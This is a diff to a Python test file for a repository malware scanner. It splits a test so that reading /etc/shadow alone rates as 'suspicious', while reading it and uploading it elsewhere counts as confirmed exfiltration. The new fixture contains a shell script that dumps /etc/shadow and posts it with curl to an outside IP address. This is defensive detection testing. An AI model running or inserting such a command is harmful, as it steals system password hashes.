@@ -178,10 +178,16 @@ def test_devops_passwd_and_authorized_keys_do_not_confirm(tmp_path):
     assert not analyze_repo(tmp_path, "legit/openclaw").confirmed
 
 
-def test_etc_shadow_read_confirms(tmp_path):
-    # Reading /etc/shadow (password hashes) IS credential theft -> Tier-A.
+def test_etc_shadow_read_confirms_only_with_an_outbound_channel(tmp_path):
+    # Reading /etc/shadow is the source; the egress schema needs the sink too.
     (tmp_path / "x.sh").write_text("#!/bin/bash\ncat /etc/shadow\n", encoding="utf-8")
-    assert analyze_repo(tmp_path, "evil/dump").confirmed
+    alone = analyze_repo(tmp_path, "odd/dump")
+    assert not alone.confirmed and alone.confidence == "suspicious"
+    (tmp_path / "x.sh").write_text(
+        "#!/bin/bash\ncat /etc/shadow > /tmp/s\ncurl -F f=@/tmp/s http://185.5.5.5/u\n",
+        encoding="utf-8")
+    sent = analyze_repo(tmp_path, "evil/dump")
+    assert sent.confirmed and sent.egress == "exfil"
 
 
 def test_etc_shadow_hardening_does_not_confirm(tmp_path):
